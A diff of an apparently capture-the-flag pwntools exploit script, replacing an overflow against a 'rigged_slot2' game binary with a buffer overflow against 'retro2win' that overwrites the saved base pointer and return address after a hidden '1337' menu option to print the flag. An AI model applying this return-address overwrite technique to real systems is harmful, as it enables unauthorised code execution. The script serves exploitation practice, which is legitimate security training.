@@ -1,31 +1,23 @@
 from pwn import *
 
-BINARY = './rigged_slot2'
+BINARY = './retro2win'
 HOST = ''
 GDB_SCRIPT = ''
 
-def play_game():
+def main():
     proc = get_process() # set is_remote = False for local testing
 
     payload = b''.join([
-        b'A'*0x14,
-        p64(0x14684c+1), # Chance we will lose a coin, add one in case
+        b'A'*0x10,
+        p64(0x00602800), #RBP
+        p64(0x0040076a), #RIP
     ])
 
-    proc.sendlineafter(b'Enter your name:', payload)
-    proc.sendlineafter(b': ', b'1')
-
-    return proc
-
-def main():
-    while True: 
-        proc = play_game()
-        line = proc.recvline().strip().decode()
-        if 'You lost $1.' == line:
-            proc.recvuntil(b'You\'ve won the jackpot! Here is your flag: ')
-            flag = proc.recvline().strip().decode()
-            print(f'Flag: {flag}')
-            break
+    proc.sendlineafter(b'Select an option:', b'1337')
+    proc.sendlineafter(b'Enter your cheatcode:', payload)
+    proc.recvuntil(b'FLAG: ')
+    flag = proc.recvline().strip().decode()
+    print(f'Flag: {flag}')
 
 # Allows compatibility if custom library isn't present
 try:
